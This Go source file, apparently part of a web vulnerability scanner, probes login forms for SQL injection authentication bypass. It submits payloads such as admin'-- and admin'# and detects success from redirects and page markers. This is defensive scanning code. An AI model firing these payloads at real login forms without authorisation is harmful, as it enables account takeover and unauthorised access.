// SQLi 认证绕过探测：登录表单上用经典注释截断 payload（admin'-- / admin'# /
// admin'/* …）提交，以**认证成功语义**（状态码转向受保护区 / 跳转目标变化 /
// 成功标记出现、失败标记消失）判定，而非响应尺寸差分。
//
// 为什么必须独立于表单盲注：绕过成功常见形态是 302 + 空正文（DVWA 成功登录
// 返回 302 到 index.php），真/假响应尺寸完全一致，尺寸差分通道判不出——
// 实测 Altoro Mutual 的 doLogin 经典 admin'-- 绕过（302 → /bank/main.jsp）
// 在盲注通道下是漏报。
package dast

import (
	"fmt"
	"strings"
)

// authBypassPayloads 注释截断型绕过 payload（{u} 替换为已知用户名）。
// 顺序即优先级：先试最常见的 admin 组合。
var authBypassUsers = []string{"admin", "administrator", "root", "test"}

var authBypassSuffixes = []string{"'-- ", "'--", "'#", "'/*", "\")-- ", "')-- "}

// runAuthBypass 对登录表单做 SQLi 认证绕过探测。
func (r *Runner) runAuthBypass(targets []FormTarget, done *int, total int) []Finding {
	var out []Finding
	for _, ft := range targets {
		if ft.Action == "" || len(ft.LoginFields) < 2 || r.stopped() {
			continue
		}
		if f := r.authBypassForm(ft, done, total); f != nil {
			if r.opts.OnHit != nil {
				r.opts.OnHit(*f)
			}
			out = append(out, *f)
		}
	}
	return out
}

// authBypassForm 单登录表单的认证绕过探测。
func (r *Runner) authBypassForm(ft FormTarget, done *int, total int) *Finding {
	userField, passField := ft.LoginFields[0], ft.LoginFields[1]
	submit := ""
	for _, f := range ft.Fields {
		low := strings.ToLower(f)
		if low == "login" || low == "submit" || low == "signin" || low == "submit.x" {
			submit = f
			break
		}
	}
	fill := func(u, p string) map[string]string {
		data := make(map[string]string, len(ft.Fields)+1)
		for _, f := range ft.Fields {
			data[f] = p
		}
		data[userField], data[passField] = u, p
		if submit != "" {
			data[submit] = "Login"
		}
		return data
	}
	post := func(u, p string) *Resp {
		resp := r.fetch.PostFormSmall(ft.Action, fill(u, p))
		*done++
		if r.prog != nil {
			r.prog(*done, total, userField+"@"+ft.Action)
		}
		return resp
	}

	// 基线 1：明显错误的口令（必失败），取其形态做「失败指纹」
	base := post("definitely_wrong_user_sl", "definitely_wrong_pass_sl")
	if base == nil || r.stopped() {
		return nil
	}
	// 基线 2：若基线本身即成功（表单无鉴权），不判（避免假阳）
	if loginSucceeded(base) {
		return nil
	}

	for _, u := range authBypassUsers {
		for _, sfx := range authBypassSuffixes {
			if r.stopped() {
				return nil
			}
			payload := u + sfx
			resp := post(payload, "x")
			if resp == nil || r.stopped() {
				continue
			}
			if !loginSucceeded(resp) {
				continue
			}
			// 双确认：同 payload 再打一次，仍成功才报
			again := post(payload, "x")
			if again == nil || !loginSucceeded(again) {
				continue
			}
			return &Finding{
				Check:    "sqli-auth-bypass",
				Title:    "SQL 注入认证绕过",
				Severity: "critical",
				URL:      ft.Action,
				Param:    userField,
				Payload:  payload,
				Evidence: fmt.Sprintf("表单字段 %s 以 %q 提交后认证成功（状态 %d；失败基线状态 %d），"+
					"注释截断使口令校验失效（双确认）",
					userField, payload, resp.Status, base.Status),
				Replay: formReplay(ft.Action, userField, payload),
				Request: "POST " + ft.Action + " HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n" +
					userField + "=" + payload + "&" + passField + "=x",
				Response: &RespSnap{Status: resp.Status, Size: len(resp.Body), Snippet: snippetOf(resp.Body)},
				Signals: []string{"注释截断 payload 认证成功（双确认）",
					fmt.Sprintf("失败基线状态 %d / 绕过成功状态 %d", base.Status, resp.Status)},
				Advice: "登录查询改用参数化查询；对用户名做输入校验",
			}
		}
	}
	return nil
}

// loginSucceeded 以「认证成功语义」判定响应是否为登录成功。
// 判据（任一）：3xx 跳转到非登录页 / 响应出现成功标记且不再有口令框 /
// 状态码 200 但正文不再含登录表单特征。
// 失败形态（重定向回登录页 / 仍含 password 输入框）判否。
func loginSucceeded(resp *Resp) bool {
	if resp == nil {
		return false
	}
	body := strings.ToLower(string(resp.Body))
	// 仍含口令输入框 → 未进入受保护区
	if strings.Contains(body, `type="password"`) || strings.Contains(body, `type='password'`) ||
		strings.Contains(body, "type=password") {
		return false
	}
	loc := strings.ToLower(resp.Header("Location"))
	isRedirect := resp.Status >= 300 && resp.Status < 400
	if isRedirect {
		// 跳回登录页 → 失败
		if strings.Contains(loc, "login") || strings.Contains(loc, "signin") ||
			strings.Contains(loc, "auth") || strings.Contains(loc, "error") {
			return false
		}
		return true
	}
	if resp.Status != 200 {
		return false
	}
	// 200 且正文出现登录后标志词（登出 / 控制台 / 欢迎 + 用户名）
	for _, mark := range []string{"logout", "log out", "sign out", "signout",
		"dashboard", "my account", "welcome,", "control panel", "控制台", "退出登录", "注销"} {
		if strings.Contains(body, mark) {
			return true
		}
	}
	// 失败提示词存在 → 判否
	for _, fail := range []string{"invalid", "incorrect", "wrong", "失败", "错误", "denied"} {
		if strings.Contains(body, fail) {
			return false
		}
	}
	return false
}
